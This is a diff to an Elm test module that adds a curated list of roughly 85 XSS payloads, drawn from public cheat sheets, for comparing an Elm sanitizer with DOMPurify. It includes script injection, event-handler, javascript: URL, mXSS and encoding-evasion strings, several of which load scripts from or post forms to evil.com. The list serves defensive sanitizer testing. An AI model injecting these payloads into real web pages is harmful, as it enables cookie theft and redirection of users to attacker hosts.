@@ -1,7 +1,9 @@
 module Tests exposing
     ( TestCase
     , TestResult
+    , ComparisonPayload
     , allTests
+    , comparisonPayloads
     , runAllTests
     , runTest
     , passCount
@@ -378,4 +380,177 @@ allowUrlTests =
       , shouldBlock   = []
       , shouldPass    = [ "mailto:user@example.com" ]
       }
+    ]
+
+
+-- ─── COMPARISON PAYLOADS ──────────────────────────────────────────────────────
+-- A curated set of ~85 XSS payloads used to compare the Elm sanitizer against
+-- DOMPurify side-by-side. Unlike TestCase, these carry no expected assertions —
+-- the comparison view simply shows what each library produces for the same input.
+--
+-- Sources: OWASP XSS filter evasion cheat sheet, PortSwigger XSS cheat sheet,
+-- HTML5 Security Cheat Sheet, known mXSS research vectors.
+
+type alias ComparisonPayload =
+    { id       : String
+    , category : String
+    , input    : String
+    }
+
+
+comparisonPayloads : List ComparisonPayload
+comparisonPayloads =
+    scriptTagPayloads
+        ++ eventHandlerPayloads
+        ++ jsUrlPayloads
+        ++ dangerousTagPayloads
+        ++ cssVectorPayloads
+        ++ mxssPayloads
+        ++ encodingPayloads
+        ++ safePayloads
+
+
+-- ─── Script Tags ──────────────────────────────────────────────────────────────
+
+scriptTagPayloads : List ComparisonPayload
+scriptTagPayloads =
+    [ { id = "s1",  category = "Script Tags", input = "<script>alert(1)</script>" }
+    , { id = "s2",  category = "Script Tags", input = "<SCRIPT>alert(1)</SCRIPT>" }
+    , { id = "s3",  category = "Script Tags", input = "<Script>alert(1)</Script>" }
+    , { id = "s4",  category = "Script Tags", input = "</script><script>alert(1)</script>" }
+    , { id = "s5",  category = "Script Tags", input = "<script type=\"text/javascript\">alert(1)</script>" }
+    , { id = "s6",  category = "Script Tags", input = "<script\n>alert(1)</script>" }
+    , { id = "s7",  category = "Script Tags", input = "<script\n  type=\"text/javascript\">\nalert(1)\n</script>" }
+    , { id = "s8",  category = "Script Tags", input = "<scr<script>ipt>alert(1)</scr</script>ipt>" }
+    , { id = "s9",  category = "Script Tags", input = "<!--<script>alert(1)</script>-->" }
+    , { id = "s10", category = "Script Tags", input = "<script>alert(String.fromCharCode(88,83,83))</script>" }
+    , { id = "s11", category = "Script Tags", input = "<script src=\"//evil.com/xss.js\"></script>" }
+    , { id = "s12", category = "Script Tags", input = "<script>document.cookie</script>" }
+    , { id = "s13", category = "Script Tags", input = "<script>eval(atob('YWxlcnQoMSk='))</script>" }
+    , { id = "s14", category = "Script Tags", input = "<<script>alert(1)<</script>" }
+    , { id = "s15", category = "Script Tags", input = "<scr\u{0000}ipt>alert(1)</scr\u{0000}ipt>" }
+    ]
+
+
+-- ─── Event Handlers ───────────────────────────────────────────────────────────
+
+eventHandlerPayloads : List ComparisonPayload
+eventHandlerPayloads =
+    [ { id = "e1",  category = "Event Handlers", input = "<img src=x onerror=alert(1)>" }
+    , { id = "e2",  category = "Event Handlers", input = "<img src=x onerror=\"alert(1)\">" }
+    , { id = "e3",  category = "Event Handlers", input = "<body onload=alert(1)>" }
+    , { id = "e4",  category = "Event Handlers", input = "<input onfocus=alert(1) autofocus>" }
+    , { id = "e5",  category = "Event Handlers", input = "<select onchange=alert(1)><option>a</option></select>" }
+    , { id = "e6",  category = "Event Handlers", input = "<details ontoggle=alert(1) open>x</details>" }
+    , { id = "e7",  category = "Event Handlers", input = "<video><source onerror=alert(1)></video>" }
+    , { id = "e8",  category = "Event Handlers", input = "<audio src=x onerror=alert(1)>" }
+    , { id = "e9",  category = "Event Handlers", input = "<div onmouseover=alert(1)>hover</div>" }
+    , { id = "e10", category = "Event Handlers", input = "<a onclick=alert(1)>click</a>" }
+    , { id = "e11", category = "Event Handlers", input = "<img src=x ONERROR=alert(1)>" }
+    , { id = "e12", category = "Event Handlers", input = "<div onclick =alert(1)>click</div>" }
+    , { id = "e13", category = "Event Handlers", input = "<p onmouseenter=alert(1)>text</p>" }
+    , { id = "e14", category = "Event Handlers", input = "<textarea onblur=alert(1) autofocus></textarea>" }
+    , { id = "e15", category = "Event Handlers", input = "<svg onload=alert(1)>test</svg>" }
+    ]
+
+
+-- ─── JavaScript URLs ──────────────────────────────────────────────────────────
+
+jsUrlPayloads : List ComparisonPayload
+jsUrlPayloads =
+    [ { id = "j1",  category = "JavaScript URLs", input = "<a href=\"javascript:alert(1)\">click</a>" }
+    , { id = "j2",  category = "JavaScript URLs", input = "<a href=\"JAVASCRIPT:alert(1)\">click</a>" }
+    , { id = "j3",  category = "JavaScript URLs", input = "<a href=\"JaVaScRiPt:alert(1)\">click</a>" }
+    , { id = "j4",  category = "JavaScript URLs", input = "<a href=\"&#106;avascript:alert(1)\">click</a>" }
+    , { id = "j5",  category = "JavaScript URLs", input = "<a href=\"&#x6A;avascript:alert(1)\">click</a>" }
+    , { id = "j6",  category = "JavaScript URLs", input = "<a href=\" javascript:alert(1)\">click</a>" }
+    , { id = "j7",  category = "JavaScript URLs", input = "<img src=\"javascript:alert(1)\">" }
+    , { id = "j8",  category = "JavaScript URLs", input = "<form action=\"javascript:alert(1)\">" }
+    , { id = "j9",  category = "JavaScript URLs", input = "<a href=\"vbscript:msgbox(1)\">click</a>" }
+    , { id = "j10", category = "JavaScript URLs", input = "<a href=\"data:text/html,<script>alert(1)</script>\">click</a>" }
+    , { id = "j11", category = "JavaScript URLs", input = "<iframe src=\"javascript:alert(1)\">" }
+    , { id = "j12", category = "JavaScript URLs", input = "<a href=\"java\tscript:alert(1)\">click</a>" }
+    , { id = "j13", category = "JavaScript URLs", input = "<a href=\"java\nscript:alert(1)\">click</a>" }
+    , { id = "j14", category = "JavaScript URLs", input = "<object data=\"javascript:alert(1)\">" }
+    , { id = "j15", category = "JavaScript URLs", input = "<a href=\"javascript\u{0000}:alert(1)\">click</a>" }
+    ]
+
+
+-- ─── Dangerous Tags ───────────────────────────────────────────────────────────
+
+dangerousTagPayloads : List ComparisonPayload
+dangerousTagPayloads =
+    [ { id = "d1",  category = "Dangerous Tags", input = "<iframe src=\"https://evil.com\"></iframe>" }
+    , { id = "d2",  category = "Dangerous Tags", input = "<object data=\"https://evil.com/payload.swf\"></object>" }
+    , { id = "d3",  category = "Dangerous Tags", input = "<embed src=\"https://evil.com/plugin.swf\">" }
+    , { id = "d4",  category = "Dangerous Tags", input = "<base href=\"https://evil.com/\">" }
+    , { id = "d5",  category = "Dangerous Tags", input = "<meta http-equiv=\"refresh\" content=\"0;url=https://evil.com\">" }
+    , { id = "d6",  category = "Dangerous Tags", input = "<link rel=\"stylesheet\" href=\"https://evil.com/evil.css\">" }
+    , { id = "d7",  category = "Dangerous Tags", input = "<form action=\"https://evil.com/steal\" method=\"post\">" }
+    , { id = "d8",  category = "Dangerous Tags", input = "<IFRAME src=\"https://evil.com\">" }
+    , { id = "d9",  category = "Dangerous Tags", input = "<frame src=\"https://evil.com\">" }
+    , { id = "d10", category = "Dangerous Tags", input = "<frameset><frame src=\"https://evil.com\"></frameset>" }
+    ]
+
+
+-- ─── CSS Vectors ──────────────────────────────────────────────────────────────
+
+cssVectorPayloads : List ComparisonPayload
+cssVectorPayloads =
+    [ { id = "c1", category = "CSS Vectors", input = "<style>body{background:url(javascript:alert(1))}</style>" }
+    , { id = "c2", category = "CSS Vectors", input = "<div style=\"background:url(javascript:alert(1))\">x</div>" }
+    , { id = "c3", category = "CSS Vectors", input = "<style>*{x:expression(alert(1))}</style>" }
+    , { id = "c4", category = "CSS Vectors", input = "<style>@import 'https://evil.com/evil.css'</style>" }
+    , { id = "c5", category = "CSS Vectors", input = "<div style=\"width:expression(alert(1))\">" }
+    ]
+
+
+-- ─── mXSS / HTML5 ────────────────────────────────────────────────────────────
+-- Mutation-based XSS: payloads that may survive regex sanitization but are
+-- re-parsed by the browser into executable form. DOMPurify uses the DOM parser
+-- internally and re-serializes, making it resistant to many mXSS vectors.
+
+mxssPayloads : List ComparisonPayload
+mxssPayloads =
+    [ { id = "m1",  category = "mXSS / HTML5", input = "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">" }
+    , { id = "m2",  category = "mXSS / HTML5", input = "<!-- --!><img src=x onerror=alert(1)>" }
+    , { id = "m3",  category = "mXSS / HTML5", input = "<listing>&lt;img src=x onerror=alert(1)&gt;</listing>" }
+    , { id = "m4",  category = "mXSS / HTML5", input = "<xmp><script>alert(1)</script></xmp>" }
+    , { id = "m5",  category = "mXSS / HTML5", input = "<plaintext><img src=x onerror=alert(1)>" }
+    , { id = "m6",  category = "mXSS / HTML5", input = "<p id=\"</p><img src=x onerror=alert(1)>\">test</p>" }
+    , { id = "m7",  category = "mXSS / HTML5", input = "<style><!--</style><img src=x onerror=alert(1)>-->" }
+    , { id = "m8",  category = "mXSS / HTML5", input = "<table><td><a href=\"javascript:alert(1)\">click</a></td></table>" }
+    , { id = "m9",  category = "mXSS / HTML5", input = "<svg><animate onbegin=alert(1) attributeName=x dur=1s>" }
+    , { id = "m10", category = "mXSS / HTML5", input = "<math><mi//xlink:href=\"data:x,<script>alert(1)</script>\">" }
+    ]
+
+
+-- ─── Encoding Tricks ──────────────────────────────────────────────────────────
+
+encodingPayloads : List ComparisonPayload
+encodingPayloads =
+    [ { id = "enc1",  category = "Encoding Tricks", input = "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>" }
+    , { id = "enc2",  category = "Encoding Tricks", input = "&lt;script&gt;alert(1)&lt;/script&gt;" }
+    , { id = "enc3",  category = "Encoding Tricks", input = "<IMG SRC=x ONERROR=alert(1)>" }
+    , { id = "enc4",  category = "Encoding Tricks", input = "<a href=\"java&#9;script:alert(1)\">click</a>" }
+    , { id = "enc5",  category = "Encoding Tricks", input = "<a href=\"java&#10;script:alert(1)\">click</a>" }
+    , { id = "enc6",  category = "Encoding Tricks", input = "<a href=\"java&#13;script:alert(1)\">click</a>" }
+    , { id = "enc7",  category = "Encoding Tricks", input = "<a href=\"&#0000106;avascript:alert(1)\">click</a>" }
+    , { id = "enc8",  category = "Encoding Tricks", input = "<img src=\"x\" onerror=\"javascript:alert(1)\">" }
+    , { id = "enc9",  category = "Encoding Tricks", input = "<a href=\"\u{0000}javascript:alert(1)\">click</a>" }
+    , { id = "enc10", category = "Encoding Tricks", input = "<iframe src=\"\u{0000}javascript:alert(1)\">" }
+    ]
+
+
+-- ─── Safe Inputs ──────────────────────────────────────────────────────────────
+-- Benign inputs that should pass through both sanitizers largely unchanged.
+-- Useful for checking that neither library over-blocks legitimate content.
+
+safePayloads : List ComparisonPayload
+safePayloads =
+    [ { id = "safe1", category = "Safe Inputs", input = "<b>bold text</b>" }
+    , { id = "safe2", category = "Safe Inputs", input = "<p>Hello <em>world</em>!</p>" }
+    , { id = "safe3", category = "Safe Inputs", input = "<span class=\"highlight\">text</span>" }
+    , { id = "safe4", category = "Safe Inputs", input = "This is plain text with no HTML." }
+    , { id = "safe5", category = "Safe Inputs", input = "<a href=\"https://example.com\">Link</a>" }
     ]
